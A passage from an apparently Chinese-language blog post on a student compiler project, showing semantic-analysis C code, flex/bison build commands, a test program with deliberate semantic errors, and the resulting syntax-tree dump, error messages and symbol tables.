              Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);<span class="comment">//函数形参</span></span><br><span class="line">                new_table.symbols[new_table.index - counter - <span class="number">1</span>].paramnum=counter;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> PARAM_LIST:</span><br><span class="line">                counter++;</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> PARAM_DEC:</span><br><span class="line">                flag=<span class="string">&#x27;P&#x27;</span>;</span><br><span class="line">                type=Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level+<span class="number">1</span>,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMP_STM:</span><br><span class="line">                flag=<span class="string">&#x27;T&#x27;</span>;</span><br><span class="line">                command=<span class="number">0</span>;</span><br><span class="line">                new_scope.TX[new_scope.top]=new_table.index;</span><br><span class="line">                new_scope.top++;</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);<span class="comment">//分析定义列表</span></span><br><span class="line">                command=<span class="number">1</span>;</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level+<span class="number">1</span>,flag,command);<span class="comment">//分析语句列表</span></span><br><span class="line">                DisplaySymbolTable();</span><br><span class="line">                new_table.index=new_scope.TX[new_scope.top<span class="number">-1</span>];</span><br><span class="line">                new_scope.top--;</span><br><span class="line">                <span class="keyword">if</span> (new_scope.top == <span class="number">0</span>)</span><br><span class="line">                    DisplaySymbolTable();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> DEF_LIST:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> VAR_DEF:</span><br><span class="line">                type=Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level+<span class="number">1</span>,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> DEC_LIST:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> STM_LIST:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);<span class="comment">//第一个语句</span></span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);<span class="comment">//其他语句</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> EXP_STMT:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> RETURN:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IF_THEN:</span><br><span class="line">            <span class="keyword">case</span> WHILE:</span><br><span class="line">            <span class="keyword">case</span> FOR:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IF_THEN_ELSE:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">2</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ASSIGNOP:</span><br><span class="line">            <span class="keyword">case</span> OR:</span><br><span class="line">            <span class="keyword">case</span> AND:</span><br><span class="line">            <span class="keyword">case</span> RELOP:</span><br><span class="line">            <span class="keyword">case</span> PLUS:</span><br><span class="line">            <span class="keyword">case</span> MINUS:</span><br><span class="line">            <span class="keyword">case</span> STAR:</span><br><span class="line">            <span class="keyword">case</span> DIV:</span><br><span class="line">            <span class="keyword">case</span> COMADD:</span><br><span class="line">            <span class="keyword">case</span> COMSUB:</span><br><span class="line">                type1=Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                type2=Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">if</span>(type1==type2)</span><br><span class="line">                    <span class="keyword">return</span> type1;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：赋值类型不匹配\n&quot;</span>,T-&gt;pos);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> AUTOADD_L:</span><br><span class="line">            <span class="keyword">case</span> AUTOSUB_L:</span><br><span class="line">            <span class="keyword">case</span> AUTOADD_R:</span><br><span class="line">            <span class="keyword">case</span> AUTOSUB_R:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> INT:</span><br><span class="line">                <span class="keyword">return</span> INT;</span><br><span class="line">            <span class="keyword">case</span> FLOAT:</span><br><span class="line">                <span class="keyword">return</span> FLOAT;</span><br><span class="line">            <span class="keyword">case</span> CHAR:</span><br><span class="line">                <span class="keyword">return</span> CHAR;</span><br><span class="line">            <span class="keyword">case</span> FUNC_CALL:</span><br><span class="line">                j=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>(new_table.symbols[j].level==<span class="number">0</span>&amp;&amp;j&lt;new_table.index)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(new_table.symbols[j].name,T-&gt;type_id)==<span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(new_table.symbols[j].flag!=<span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数名%s在符号表中定义为变量\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    j++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(new_table.symbols[j].level==<span class="number">1</span>||j==new_table.index)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数%s未定义\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                type=new_table.symbols[j+<span class="number">1</span>].type;</span><br><span class="line">                counter=<span class="number">0</span>;</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);<span class="comment">//分析参数</span></span><br><span class="line">                <span class="keyword">if</span>(new_table.symbols[j].paramnum!=counter)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数调用%s参数个数不匹配\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                <span class="keyword">return</span> new_table.symbols[j].type;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ARGS:</span><br><span class="line">                counter++;</span><br><span class="line">                t=Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">if</span>(type!=t)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数调用的第%d个参数类型不匹配\n&quot;</span>,T-&gt;pos,counter);</span><br><span class="line">                type=new_table.symbols[j+counter+<span class="number">1</span>].type;</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>编译与结果</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flex lexer.l</span><br><span class="line">bison -d -v parser.y </span><br><span class="line">gcc display.c parser.tab.c lex.yy.c -lfl -o test1</span><br></pre></td></tr></table></figure>
<p>测试文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a,b,c;</span><br><span class="line"><span class="keyword">float</span> m,n;</span><br><span class="line"><span class="keyword">char</span> c1,c2;</span><br><span class="line"><span class="keyword">char</span> h[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> a,b;<span class="comment">//全局变量中出现相同变量名</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fibo</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> haha;</span><br><span class="line">	<span class="keyword">if</span>(a == <span class="number">1</span> || a == <span class="number">2</span>)&#123;</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">	<span class="keyword">for</span>(i&lt;<span class="number">15</span>)&#123;</span><br><span class="line">          i++;</span><br><span class="line">	&#125;</span><br><span class="line">        </span><br><span class="line">        j = i+<span class="number">1</span>;<span class="comment">//无定义错误</span></span><br><span class="line">        haha(c);<span class="comment">//未定义的函数</span></span><br><span class="line">        a = fibo(<span class="number">1</span>,<span class="number">2</span>);<span class="comment">//参数个数不匹配</span></span><br><span class="line">        b = fibo(m);<span class="comment">//参数类型不匹配</span></span><br><span class="line">	</span><br><span class="line">        <span class="keyword">return</span> fibo(a<span class="number">-1</span>)+fibo(a<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">h1</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> a)</span></span>&#123;&#125;<span class="comment">//出现了相同函数参数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">h2</span><span class="params">()</span></span>&#123;<span class="keyword">int</span> hah; <span class="keyword">float</span> hah;&#125;<span class="comment">//局部变量名出现了相同的变量名</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">h1</span><span class="params">()</span></span>&#123;&#125;<span class="comment">//重复的函数名</span></span><br></pre></td></tr></table></figure>
<p>最终结果：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br></pre></td><td class="code"><pre><span class="line"><span class="code"> 外部变量定义：</span></span><br><span class="line"><span class="code">     类型：int</span></span><br><span class="line"><span class="code">     变量名：</span></span><br><span class="line"><span class="code">          ID： a</span></span><br><span class="line"><span class="code">          ID： b</span></span><br><span class="line"><span class="code">          ID： c</span></span><br><span class="line"><span class="code"> 外部变量定义：</span></span><br><span class="line"><span class="code">     类型：float</span></span><br><span class="line"><span class="code">     变量名：</span></span><br><span class="line"><span class="code">          ID： m</span></span><br><span class="line"><span class="code">          ID： n</span></span><br><span class="line"><span class="code"> 外部变量定义：</span></span><br><span class="line"><span class="code">     类型：char</span></span><br><span class="line"><span class="code">     变量名：</span></span><br><span class="line"><span class="code">          ID： c1</span></span><br><span class="line"><span class="code">          ID： c2</span></span><br><span class="line"><span class="code"> 数组定义：</span></span><br><span class="line"><span class="code">     类型：char</span></span><br><span class="line"><span class="code">     数组名：h</span></span><br><span class="line"><span class="code">     数组大小：</span></span><br><span class="line"><span class="code">          INT： 10</span></span><br><span class="line"><span class="code"> 外部变量定义：</span></span><br><span class="line"><span class="code">     类型：float</span></span><br><span class="line"><span class="code">     变量名：</span></span><br><span class="line"><span class="code">          ID： a</span></span><br><span class="line"><span class="code">          ID： b</span></span><br><span class="line"><span class="code"> 函数定义：</span></span><br><span class="line"><span class="code">     类型：int</span></span><br><span class="line"><span class="code">     函数名：fibo</span></span><br><span class="line"><span class="code">     函数型参：</span></span><br><span class="line"><span class="code">          类型：int</span></span><br><span class="line"><span class="code">          ID： a</span></span><br><span class="line"><span class="code">     复合语句：</span></span><br><span class="line"><span class="code">          复合语句的变量定义：</span></span><br><span class="line"><span class="code">               局部变量名：</span></span><br><span class="line"><span class="code">                    类型：int</span></span><br><span class="line"><span class="code">                    变量名：</span></span><br><span class="line"><span class="code">                         ID： i</span></span><br><span class="line"><span class="code">               局部变量名：</span></span><br><span class="line"><span class="code">                    类型：int</span></span><br><span class="line"><span class="code">                    变量名：</span></span><br><span class="line"><span class="code">                         ID： haha</span></span><br><span class="line"><span class="code">          复合语句的语句部分：</span></span><br><span class="line"><span class="code">               条件语句（if-else）：</span></span><br><span class="line"><span class="code">               条件：</span></span><br><span class="line"><span class="code">                    OR</span></span><br><span class="line"><span class="code">                         ==</span></span><br><span class="line"><span class="code">                              ID： a</span></span><br><span class="line"><span class="code">                              INT： 1</span></span><br><span class="line"><span class="code">                         ==</span></span><br><span class="line"><span class="code">                              ID： a</span></span><br><span class="line"><span class="code">                              INT： 2</span></span><br><span class="line"><span class="code">               IF语句：</span></span><br><span class="line"><span class="code">                    复合语句：</span></span><br><span class="line"><span class="code">                         复合语句的变量定义：</span></span><br><span class="line"><span class="code">                         复合语句的语句部分：</span></span><br><span class="line"><span class="code">                              返回语句：</span></span><br><span class="line"><span class="code">                                   INT： 1</span></span><br><span class="line"><span class="code">               循环语句（for）：</span></span><br><span class="line"><span class="code">                    循环条件：</span></span><br><span class="line"><span class="code">                    &lt;</span></span><br><span class="line"><span class="code">                         ID： i</span></span><br><span class="line"><span class="code">                         INT： 15</span></span><br><span class="line"><span class="code">                    循环体：</span></span><br><span class="line"><span class="code">                    复合语句：</span></span><br><span class="line"><span class="code">                         复合语句的变量定义：</span></span><br><span class="line"><span class="code">                         复合语句的语句部分：</span></span><br><span class="line"><span class="code">                              表达式语句：</span></span><br><span class="line"><span class="code">                                   AUTOADD</span></span><br><span class="line"><span class="code">                                        ID： i</span></span><br><span class="line"><span class="code">               表达式语句：</span></span><br><span class="line"><span class="code">                    ASSIGNOP</span></span><br><span class="line"><span class="code">                         ID： j</span></span><br><span class="line"><span class="code">                         PLUS</span></span><br><span class="line"><span class="code">                              ID： i</span></span><br><span class="line"><span class="code">                              INT： 1</span></span><br><span class="line"><span class="code">               表达式语句：</span></span><br><span class="line"><span class="code">                    函数调用：</span></span><br><span class="line"><span class="code">                         函数名：haha</span></span><br><span class="line"><span class="code">                         第一个实际参数表达式：</span></span><br><span class="line"><span class="code">                              ID： c</span></span><br><span class="line"><span class="code">               表达式语句：</span></span><br><span class="line"><span class="code">                    ASSIGNOP</span></span><br><span class="line"><span class="code">                         ID： a</span></span><br><span class="line"><span class="code">                         函数调用：</span></span><br><span class="line"><span class="code">                              函数名：fibo</span></span><br><span class="line"><span class="code">                              第一个实际参数表达式：</span></span><br><span class="line"><span class="code">                                   INT： 1</span></span><br><span class="line"><span class="code">                                        INT： 2</span></span><br><span class="line"><span class="code">               表达式语句：</span></span><br><span class="line"><span class="code">                    ASSIGNOP</span></span><br><span class="line"><span class="code">                         ID： b</span></span><br><span class="line"><span class="code">                         函数调用：</span></span><br><span class="line"><span class="code">                              函数名：fibo</span></span><br><span class="line"><span class="code">                              第一个实际参数表达式：</span></span><br><span class="line"><span class="code">                                   ID： m</span></span><br><span class="line"><span class="code">               返回语句：</span></span><br><span class="line"><span class="code">                    PLUS</span></span><br><span class="line"><span class="code">                         函数调用：</span></span><br><span class="line"><span class="code">                              函数名：fibo</span></span><br><span class="line"><span class="code">                              第一个实际参数表达式：</span></span><br><span class="line"><span class="code">                                   MINUS</span></span><br><span class="line"><span class="code">                                        ID： a</span></span><br><span class="line"><span class="code">                                        INT： 1</span></span><br><span class="line"><span class="code">                         函数调用：</span></span><br><span class="line"><span class="code">                              函数名：fibo</span></span><br><span class="line"><span class="code">                              第一个实际参数表达式：</span></span><br><span class="line"><span class="code">                                   MINUS</span></span><br><span class="line"><span class="code">                                        ID： a</span></span><br><span class="line"><span class="code">                                        INT： 2</span></span><br><span class="line"><span class="code"> 函数定义：</span></span><br><span class="line"><span class="code">     类型：int</span></span><br><span class="line"><span class="code">     函数名：h1</span></span><br><span class="line"><span class="code">     函数型参：</span></span><br><span class="line"><span class="code">          类型：int</span></span><br><span class="line"><span class="code">          ID： a</span></span><br><span class="line"><span class="code">          类型：int</span></span><br><span class="line"><span class="code">          ID： a</span></span><br><span class="line"><span class="code">     复合语句：</span></span><br><span class="line"><span class="code">          复合语句的变量定义：</span></span><br><span class="line"><span class="code">          复合语句的语句部分：</span></span><br><span class="line"><span class="code"> 函数定义：</span></span><br><span class="line"><span class="code">     类型：int</span></span><br><span class="line"><span class="code">     函数名：h2</span></span><br><span class="line"><span class="code">     函数型参：</span></span><br><span class="line"><span class="code">     复合语句：</span></span><br><span class="line"><span class="code">          复合语句的变量定义：</span></span><br><span class="line"><span class="code">               局部变量名：</span></span><br><span class="line"><span class="code">                    类型：int</span></span><br><span class="line"><span class="code">                    变量名：</span></span><br><span class="line"><span class="code">                         ID： hah</span></span><br><span class="line"><span class="code">               局部变量名：</span></span><br><span class="line"><span class="code">                    类型：float</span></span><br><span class="line"><span class="code">                    变量名：</span></span><br><span class="line"><span class="code">                         ID： hah</span></span><br><span class="line"><span class="code">          复合语句的语句部分：</span></span><br><span class="line"><span class="code"> 函数定义：</span></span><br><span class="line"><span class="code">     类型：float</span></span><br><span class="line"><span class="code">     函数名：h1</span></span><br><span class="line"><span class="code">     函数型参：</span></span><br><span class="line"><span class="code">     复合语句：</span></span><br><span class="line"><span class="code">          复合语句的变量定义：</span></span><br><span class="line"><span class="code">          复合语句的语句部分：</span></span><br><span class="line">ERROR！第6行：全局变量中出现相同变量名a</span><br><span class="line">ERROR！第6行：全局变量中出现相同变量名b</span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	1</span><br><span class="line">9	a	1	int	P	</span><br><span class="line">10	i	1	int	T	</span><br><span class="line"><span class="section">11	haha	1	int	T	</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	1</span><br><span class="line">9	a	1	int	P	</span><br><span class="line">10	i	1	int	T	</span><br><span class="line"><span class="section">11	haha	1	int	T	</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">ERROR！第21行：变量名j未定义</span><br><span class="line">ERROR！第21行：赋值类型不匹配</span><br><span class="line">ERROR！第22行：函数haha未定义</span><br><span class="line">ERROR！第23行：函数调用fibo参数个数不匹配</span><br><span class="line">ERROR！第23行：赋值类型不匹配</span><br><span class="line">ERROR！第24行：函数调用的第1个参数类型不匹配</span><br><span class="line">ERROR！第24行：赋值类型不匹配</span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	1</span><br><span class="line">9	a	1	int	P	</span><br><span class="line">10	i	1	int	T	</span><br><span class="line"><span 